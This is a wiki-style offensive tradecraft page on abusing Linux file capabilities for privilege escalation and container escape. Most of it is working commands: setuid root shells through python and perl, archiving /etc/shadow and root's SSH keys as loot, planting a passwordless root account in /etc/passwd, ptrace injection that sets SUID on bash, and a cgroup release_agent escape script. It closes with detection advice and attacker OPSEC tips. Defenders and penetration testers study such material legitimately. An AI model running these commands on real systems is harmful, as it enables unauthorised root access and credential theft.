---
title: Linux capabilities abuse
slug: linux-capabilities-abuse
---

> **TL;DR:** Capabilities split root's power into ~40 named privileges; admins use them to avoid SUID, but `cap_setuid`, `cap_sys_admin`, `cap_dac_read_search`, `cap_chown`, `cap_dac_override`, and `cap_sys_ptrace` are each individually equivalent to full root if the binary that carries them is scriptable. `getcap -r /` finds the targets; the GTFOBins `#+capabilities` filter has the escapes.

## What it is
Linux 2.2+ replaces the binary root/non-root model with file and process capabilities (`man capabilities(7)`). A file capability is stored in an xattr (`security.capability`); when execve loads such a file, the kernel grants the listed caps to the resulting process — no setuid bit, no UID change. The intent is least-privilege ("ping needs to open a raw socket, not all of root"), but several capabilities trivially escalate back to UID 0 because they let the holder rewrite the security model.

## Preconditions / where it applies
- Local shell.
- A binary with one of the dangerous file capabilities (`getcap -r / 2>/dev/null`).
- For container escapes: the container itself was started with one of these caps in `--cap-add`.

## Tradecraft
**Step 1 — Enumerate.**

```bash
getcap -r / 2>/dev/null                       # all file caps
getpcaps $$                                   # current process caps
capsh --print                                 # human-readable current set
```

`getcap` output format: `/path/binary cap_name+eip` where flags mean Effective, Inheritable, Permitted. `+ep` is the dangerous combination — the capability is permitted and automatically effective.

**Pattern 1 — `cap_setuid+ep`.** The binary can call `setuid(0)` directly:

```bash
# Found: /usr/bin/python3.10 cap_setuid+ep
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Found: /usr/bin/perl cap_setuid+ep
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

**Pattern 2 — `cap_dac_read_search+ep`.** Bypasses all DAC read/search checks. You can't write, but you can read `/etc/shadow`, root's SSH keys, kubeconfig, anything:

```bash
# Found: /usr/bin/tar cap_dac_read_search+ep
tar -czf /tmp/loot.tar.gz /etc/shadow /root/.ssh /root/.kube /var/lib/credentials
# crack offline
```

**Pattern 3 — `cap_dac_override+ep`.** Bypasses all DAC checks including write. Edit `/etc/passwd`:

```bash
# Found: /usr/bin/vim cap_dac_override+ep
vim /etc/passwd
# append: r00t::0:0::/root:/bin/bash
```

**Pattern 4 — `cap_chown+ep`.** Chown anything to anything:

```bash
# Found: /usr/bin/chown cap_chown+ep
chown $(id -u) /etc/shadow
cat /etc/shadow
```

**Pattern 5 — `cap_sys_admin+ep`.** Effectively root — can mount filesystems, manipulate namespaces, load BPF. With `mount`:

```bash
# Mount host root inside whatever boundary you're in
mkdir /tmp/r && mount -o bind / /tmp/r
chroot /tmp/r /bin/bash
```

**Pattern 6 — `cap_sys_ptrace+ep`.** Attach to any process; inject shellcode into a root daemon:

```bash
# Find a root PID
ps -ef | awk '$1=="root"{print $2}'
# Use gdb/strace to attach (also needs YAMA ptrace_scope=0 or that bit set)
gdb -p <root_pid>
(gdb) call (int)system("chmod +s /bin/bash")
```

**Pattern 7 — Containers.** A Docker container started with `--cap-add=SYS_MODULE` can `insmod` a kernel module — instant host root. `SYS_ADMIN` enables `unshare`, `mount`, and `release_agent` cgroup escapes. `NET_ADMIN` + `NET_RAW` lets you sniff host traffic when the netns is shared.

```bash
# In a container with SYS_ADMIN
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps -ef > $host_path/output" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

**Pattern 8 — Inheritable propagation.** A binary with `cap_*+i` only gets the cap if the *parent* already has it in its inheritable set. Rarely useful directly, but a misconfigured `pam_cap.so` (`/etc/security/capability.conf`) can grant a user `cap_setuid+i` for every login session — combined with a `+ei` binary, root.

## Detection and defence
- Audit: `find / -type f -exec getcap {} \; 2>/dev/null` quarterly. Diff against an inventory.
- `auditd` `-a always,exit -F arch=b64 -S capset -F auid!=0 -k capset` flags processes adding caps.
- Defence: prefer setuid-less binaries that drop caps after the initial action. Never grant `cap_setuid`, `cap_dac_*`, `cap_chown`, `cap_sys_admin`, `cap_sys_ptrace`, or `cap_sys_module` on a binary that has any code path beyond its single purpose.
- For containers: drop ALL caps and add only the minimum (`--cap-drop=ALL --cap-add=NET_BIND_SERVICE`). Use the `no-new-privileges` securebit so children can't gain caps.
- AppArmor/SELinux profiles bound capabilities to specific binaries even if file caps are set.

## OPSEC pitfalls
- Setting a capability on a binary you copy to `/tmp` requires already being root (`setcap` itself needs `cap_setfcap`). Don't bother as a persistence trick if you'll lose the priv.
- `dmesg` and `auditd` log capability grants and `capset` syscalls; a sudden `cap_sys_admin` process from a non-system parent stands out.

## References
- [man capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) — canonical reference for every cap
- [GTFOBins — capabilities](https://gtfobins.github.io/#+capabilities) — escape catalogue
- [HackTricks — Linux Capabilities](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html) — practitioner walkthrough
- [Docker — Linux capabilities for containers](https://docs.docker.com/engine/security/#linux-kernel-capabilities) — container guidance

See also: [[linux-suid-sgid-gtfobins]], [[sudo-misconfig-exploitation]], [[polkit-pkexec-privesc]], [[container-runtime-escapes-modern]]
